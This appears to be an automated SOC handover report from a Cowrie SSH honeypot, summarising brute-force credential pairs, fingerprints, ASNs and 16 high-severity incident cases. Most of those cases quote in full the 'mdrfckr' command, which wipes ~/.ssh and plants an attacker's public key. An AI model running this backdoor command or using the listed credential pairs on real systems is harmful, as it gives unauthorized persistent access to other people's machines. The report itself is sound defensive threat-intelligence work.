# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-04-12 |
| **Generated At** | 2026-04-12T18:44:04Z |
| **Shift Time** | 18:44 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **46** |
| Confirmed Threats | **44** |
| False Positives Filtered | **2** (4.3%) |
| Unique Attacker IPs | **18** |
| Countries of Origin | **8** |
| High Severity Cases | **16** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **30** |
| Malware Samples Analyzed | **0** HIGH · **16** MED · 2 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **33** |
| Unique Credential Pairs | **18** |
| Unique Usernames | **9** |
| Unique Passwords | **18** |
| Successful Auth Pairs | **15** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 16 |
| `345gs5662d34` | 8 |
| `hath` | 2 |
| `test` | 2 |
| `sshtest` | 1 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `345gs5662d34` | 8 |
| `3245gs5662d34` | 8 |
| `hath` | 2 |
| `1qaz@WSX.` | 1 |
| `sshtest` | 1 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `345gs5662d34` | `345gs5662d34` | 8 |
| `root` | `3245gs5662d34` | 8 |
| `hath` | `hath` | 2 |
| `root` | `1qaz@WSX.` | 1 |
| `sshtest` | `sshtest` | 1 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `1qaz@WSX.` | `103.171.69.82` | 2026-04-12T17:09:40 |
| `root` | `3245gs5662d34` | `103.171.69.82` | 2026-04-12T17:09:42 |
| `root` | `QAZwsx@123` | `114.35.59.237` | 2026-04-12T18:23:32 |
| `root` | `3245gs5662d34` | `114.35.59.237` | 2026-04-12T18:23:36 |
| `root` | `ZAQ!2wsx4321@#` | `39.115.183.206` | 2026-04-12T18:24:05 |
| `root` | `3245gs5662d34` | `39.115.183.206` | 2026-04-12T18:24:09 |
| `root` | `root12@#` | `40.121.200.75` | 2026-04-12T18:25:44 |
| `root` | `3245gs5662d34` | `40.121.200.75` | 2026-04-12T18:25:49 |
| `root` | `Qazwsx4321!` | `83.171.89.209` | 2026-04-12T18:25:58 |
| `root` | `3245gs5662d34` | `83.171.89.209` | 2026-04-12T18:26:02 |
| `root` | `Qwert@123` | `112.151.178.49` | 2026-04-12T18:29:51 |
| `root` | `3245gs5662d34` | `112.151.178.49` | 2026-04-12T18:29:55 |
| `root` | `ccAA000` | `58.186.20.101` | 2026-04-12T18:30:16 |
| `root` | `3245gs5662d34` | `58.186.20.101` | 2026-04-12T18:30:19 |
| `root` | `India@123` | `112.151.178.49` | 2026-04-12T18:34:03 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **46** |
| Sessions with Fingerprint | **2** |
| Unique HASSH Fingerprints | **2** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| libssh | 36 |
| Unknown | 1 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `03a80b21afa8...` | Modern SSH client | 36 | 10 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `03a80b21afa8...` | libssh | 36 | 10 | Modern SSH client |
| `95420f9d932d...` | Unknown | 1 | 1 | — |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **1** |
| Campaign Clusters | **1** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 8 | 7 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `58.186.20.101`, `83.171.89.209`, `114.35.59.237`, `103.171.69.82`, `40.121.200.75`, `112.151.178.49`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **18** |
| Unique ASNs | **14** |
| High-Risk ASNs | **12** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS8075` | Microsoft Corporation | 3 | HIGH |
| `AS38365` | Beijing Baidu Netcom Science and Technology Co., Ltd. | 2 | HIGH |
| `AS3462` | Data Communication Business Group | 2 | HIGH |
| `AS18403` | FPT Telecom Company | 1 | HIGH |
| `AS4766` | Korea Telecom | 1 | HIGH |
| `AS137718` | Beijing Volcano Engine Technology Co., Ltd. | 1 | HIGH |
| `AS12389` | PJSC Rostelecom | 1 | HIGH |
| `AS9318` | SK Broadband Co Ltd | 1 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (16)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-392f69ff92c5

| Field | Detail |
|---|---|
| **Source IP** | `103.171.69[.]82` |
| **First Seen** | 2026-04-12 17:09 |
| **Last Seen** | 2026-04-12 17:09 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-12 17:09:40` | `cowrie.session.connect` |
| `2026-04-12 17:09:40` | `cowrie.client.version` |
| `2026-04-12 17:09:40` | `cowrie.client.kex` |
| `2026-04-12 17:09:40` | `cowrie.login.success` |
| `2026-04-12 17:09:40` | `cowrie.session.params` |
| `2026-04-12 17:09:40` | `cowrie.command.input` |
| `2026-04-12 17:09:40` | `cowrie.command.failed` |
| `2026-04-12 17:09:40` | `cowrie.log.closed` |
| `2026-04-12 17:09:41` | `cowrie.session.params` |
| `2026-04-12 17:09:41` | `cowrie.command.input` |
| `2026-04-12 17:09:41` | `cowrie.session.file_download` |
| `2026-04-12 17:09:41` | `cowrie.log.closed` |
| `2026-04-12 17:09:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.171.69[.]82` to AbuseIPDB if not already reported
- [ ] Block `103.171.69[.]82` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c014d4d51db3

| Field | Detail |
|---|---|
| **Source IP** | `103.171.69[.]82` |
| **First Seen** | 2026-04-12 17:09 |
| **Last Seen** | 2026-04-12 17:09 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-12 17:09:42` | `cowrie.session.connect` |
| `2026-04-12 17:09:42` | `cowrie.client.version` |
| `2026-04-12 17:09:42` | `cowrie.client.kex` |
| `2026-04-12 17:09:42` | `cowrie.login.success` |
| `2026-04-12 17:09:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.171.69[.]82` to AbuseIPDB if not already reported
- [ ] Block `103.171.69[.]82` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a76a83424da1

| Field | Detail |
|---|---|
| **Source IP** | `114.35.59[.]237` |
| **First Seen** | 2026-04-12 18:23 |
| **Last Seen** | 2026-04-12 18:23 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-12 18:23:31` | `cowrie.session.connect` |
| `2026-04-12 18:23:31` | `cowrie.client.version` |
| `2026-04-12 18:23:31` | `cowrie.client.kex` |
| `2026-04-12 18:23:32` | `cowrie.login.success` |
| `2026-04-12 18:23:32` | `cowrie.session.params` |
| `2026-04-12 18:23:32` | `cowrie.command.input` |
| `2026-04-12 18:23:32` | `cowrie.command.failed` |
| `2026-04-12 18:23:32` | `cowrie.log.closed` |
| `2026-04-12 18:23:33` | `cowrie.session.params` |
| `2026-04-12 18:23:33` | `cowrie.command.input` |
| `2026-04-12 18:23:33` | `cowrie.session.file_download` |
| `2026-04-12 18:23:33` | `cowrie.log.closed` |
| `2026-04-12 18:23:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `114.35.59[.]237` to AbuseIPDB if not already reported
- [ ] Block `114.35.59[.]237` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ee9d8d2fa9f3

| Field | Detail |
|---|---|
| **Source IP** | `114.35.59[.]237` |
| **First Seen** | 2026-04-12 18:23 |
| **Last Seen** | 2026-04-12 18:23 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-12 18:23:35` | `cowrie.session.connect` |
| `2026-04-12 18:23:35` | `cowrie.client.version` |
| `2026-04-12 18:23:35` | `cowrie.client.kex` |
| `2026-04-12 18:23:36` | `cowrie.login.success` |
| `2026-04-12 18:23:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `114.35.59[.]237` to AbuseIPDB if not already reported
- [ ] Block `114.35.59[.]237` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-42999792250b

| Field | Detail |
|---|---|
| **Source IP** | `39.115.183[.]206` |
| **First Seen** | 2026-04-12 18:24 |
| **Last Seen** | 2026-04-12 18:24 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-12 18:24:05` | `cowrie.session.connect` |
| `2026-04-12 18:24:05` | `cowrie.client.version` |
| `2026-04-12 18:24:05` | `cowrie.client.kex` |
| `2026-04-12 18:24:05` | `cowrie.login.success` |
| `2026-04-12 18:24:05` | `cowrie.session.params` |
| `2026-04-12 18:24:05` | `cowrie.command.input` |
| `2026-04-12 18:24:05` | `cowrie.command.failed` |
| `2026-04-12 18:24:06` | `cowrie.log.closed` |
| `2026-04-12 18:24:06` | `cowrie.session.params` |
| `2026-04-12 18:24:06` | `cowrie.command.input` |
| `2026-04-12 18:24:06` | `cowrie.session.file_download` |
| `2026-04-12 18:24:06` | `cowrie.log.closed` |
| `2026-04-12 18:24:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `39.115.183[.]206` to AbuseIPDB if not already reported
- [ ] Block `39.115.183[.]206` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a3f13d66af43

| Field | Detail |
|---|---|
| **Source IP** | `39.115.183[.]206` |
| **First Seen** | 2026-04-12 18:24 |
| **Last Seen** | 2026-04-12 18:24 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-12 18:24:08` | `cowrie.session.connect` |
| `2026-04-12 18:24:08` | `cowrie.client.version` |
| `2026-04-12 18:24:08` | `cowrie.client.kex` |
| `2026-04-12 18:24:09` | `cowrie.login.success` |
| `2026-04-12 18:24:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `39.115.183[.]206` to AbuseIPDB if not already reported
- [ ] Block `39.115.183[.]206` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0bb7e7d48a79

| Field | Detail |
|---|---|
| **Source IP** | `40.121.200[.]75` |
| **First Seen** | 2026-04-12 18:25 |
| **Last Seen** | 2026-04-12 18:25 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-12 18:25:43` | `cowrie.session.connect` |
| `2026-04-12 18:25:43` | `cowrie.client.version` |
| `2026-04-12 18:25:43` | `cowrie.client.kex` |
| `2026-04-12 18:25:44` | `cowrie.login.success` |
| `2026-04-12 18:25:45` | `cowrie.session.params` |
| `2026-04-12 18:25:45` | `cowrie.command.input` |
| `2026-04-12 18:25:45` | `cowrie.command.failed` |
| `2026-04-12 18:25:45` | `cowrie.log.closed` |
| `2026-04-12 18:25:45` | `cowrie.session.params` |
| `2026-04-12 18:25:45` | `cowrie.command.input` |
| `2026-04-12 18:25:46` | `cowrie.session.file_download` |
| `2026-04-12 18:25:46` | `cowrie.log.closed` |
| `2026-04-12 18:25:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `40.121.200[.]75` to AbuseIPDB if not already reported
- [ ] Block `40.121.200[.]75` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-da28ebbc756e

| Field | Detail |
|---|---|
| **Source IP** | `40.121.200[.]75` |
| **First Seen** | 2026-04-12 18:25 |
| **Last Seen** | 2026-04-12 18:25 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-12 18:25:48` | `cowrie.session.connect` |
| `2026-04-12 18:25:48` | `cowrie.client.version` |
| `2026-04-12 18:25:49` | `cowrie.client.kex` |
| `2026-04-12 18:25:49` | `cowrie.login.success` |
| `2026-04-12 18:25:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `40.121.200[.]75` to AbuseIPDB if not already reported
- [ ] Block `40.121.200[.]75` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e34eb3497997

| Field | Detail |
|---|---|
| **Source IP** | `83.171.89[.]209` |
| **First Seen** | 2026-04-12 18:25 |
| **Last Seen** | 2026-04-12 18:26 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-12 18:25:57` | `cowrie.session.connect` |
| `2026-04-12 18:25:57` | `cowrie.client.version` |
| `2026-04-12 18:25:57` | `cowrie.client.kex` |
| `2026-04-12 18:25:58` | `cowrie.login.success` |
| `2026-04-12 18:25:58` | `cowrie.session.params` |
| `2026-04-12 18:25:58` | `cowrie.command.input` |
| `2026-04-12 18:25:58` | `cowrie.command.failed` |
| `2026-04-12 18:25:58` | `cowrie.log.closed` |
| `2026-04-12 18:25:59` | `cowrie.session.params` |
| `2026-04-12 18:25:59` | `cowrie.command.input` |
| `2026-04-12 18:25:59` | `cowrie.session.file_download` |
| `2026-04-12 18:25:59` | `cowrie.log.closed` |
| `2026-04-12 18:26:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `83.171.89[.]209` to AbuseIPDB if not already reported
- [ ] Block `83.171.89[.]209` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ab462e14eda8

| Field | Detail |
|---|---|
| **Source IP** | `83.171.89[.]209` |
| **First Seen** | 2026-04-12 18:26 |
| **Last Seen** | 2026-04-12 18:26 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-12 18:26:01` | `cowrie.session.connect` |
| `2026-04-12 18:26:01` | `cowrie.client.version` |
| `2026-04-12 18:26:02` | `cowrie.client.kex` |
| `2026-04-12 18:26:02` | `cowrie.login.success` |
| `2026-04-12 18:26:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `83.171.89[.]209` to AbuseIPDB if not already reported
- [ ] Block `83.171.89[.]209` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-64faf60aa7fc

| Field | Detail |
|---|---|
| **Source IP** | `112.151.178[.]49` |
| **First Seen** | 2026-04-12 18:29 |
| **Last Seen** | 2026-04-12 18:29 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-12 18:29:50` | `cowrie.session.connect` |
| `2026-04-12 18:29:50` | `cowrie.client.version` |
| `2026-04-12 18:29:50` | `cowrie.client.kex` |
| `2026-04-12 18:29:51` | `cowrie.login.success` |
| `2026-04-12 18:29:51` | `cowrie.session.params` |
| `2026-04-12 18:29:51` | `cowrie.command.input` |
| `2026-04-12 18:29:51` | `cowrie.command.failed` |
| `2026-04-12 18:29:51` | `cowrie.log.closed` |
| `2026-04-12 18:29:52` | `cowrie.session.params` |
| `2026-04-12 18:29:52` | `cowrie.command.input` |
| `2026-04-12 18:29:52` | `cowrie.session.file_download` |
| `2026-04-12 18:29:52` | `cowrie.log.closed` |
| `2026-04-12 18:29:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `112.151.178[.]49` to AbuseIPDB if not already reported
- [ ] Block `112.151.178[.]49` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2aa40681a548

| Field | Detail |
|---|---|
| **Source IP** | `112.151.178[.]49` |
| **First Seen** | 2026-04-12 18:29 |
| **Last Seen** | 2026-04-12 18:29 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-12 18:29:54` | `cowrie.session.connect` |
| `2026-04-12 18:29:54` | `cowrie.client.version` |
| `2026-04-12 18:29:54` | `cowrie.client.kex` |
| `2026-04-12 18:29:55` | `cowrie.login.success` |
| `2026-04-12 18:29:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `112.151.178[.]49` to AbuseIPDB if not already reported
- [ ] Block `112.151.178[.]49` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7525ff877f24

| Field | Detail |
|---|---|
| **Source IP** | `58.186.20[.]101` |
| **First Seen** | 2026-04-12 18:30 |
| **Last Seen** | 2026-04-12 18:30 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-12 18:30:15` | `cowrie.session.connect` |
| `2026-04-12 18:30:15` | `cowrie.client.version` |
| `2026-04-12 18:30:15` | `cowrie.client.kex` |
| `2026-04-12 18:30:16` | `cowrie.login.success` |
| `2026-04-12 18:30:16` | `cowrie.session.params` |
| `2026-04-12 18:30:16` | `cowrie.command.input` |
| `2026-04-12 18:30:16` | `cowrie.command.failed` |
| `2026-04-12 18:30:16` | `cowrie.log.closed` |
| `2026-04-12 18:30:16` | `cowrie.session.params` |
| `2026-04-12 18:30:16` | `cowrie.command.input` |
| `2026-04-12 18:30:17` | `cowrie.session.file_download` |
| `2026-04-12 18:30:17` | `cowrie.log.closed` |
| `2026-04-12 18:30:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `58.186.20[.]101` to AbuseIPDB if not already reported
- [ ] Block `58.186.20[.]101` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
